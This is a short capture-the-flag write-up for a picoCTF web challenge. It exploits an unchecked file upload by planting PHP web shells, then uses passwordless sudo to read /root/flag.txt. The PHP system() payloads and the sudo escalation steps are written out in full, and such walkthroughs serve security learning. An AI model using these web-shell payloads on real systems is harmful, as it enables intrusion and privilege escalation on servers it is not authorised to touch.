# URL
https://play.picoctf.org/practice/challenge/482?category=1&page=1
# Challenge
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
You can access the web application here!
# Method of Solving
* After doing CTFs for a while, I instantly noticed it likely had to do with a file upload -> RCE.
* I've decided to use a PHP file upload
```
  <?php system('echo hello'); ?>
```
* When uploading, the website tells us: "The file exploit.php has been uploaded Path: uploads/exploit.php" All I had to do was navigate here: http://standard-pizzas.picoctf.net:63316/uploads/exploit.php
* Surprisingly, the website just says "hello," meaning the PHP code does execute on the server
* The hints tell us to run the command sudo -l (sudoers), so let's run that!
  ```
  <?php system('sudo -l'); ?>
  ```
  * To no surprise, Matching Defaults entries for www-data on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL, we can run commands as any user
  * Modify the PHP script
    ```
    <?php system('sudo cat /root/flag.txt'); ?>
    ```
  * After the upload, I head over to the website to find out that indeed it works since the flag is printed!
  
  
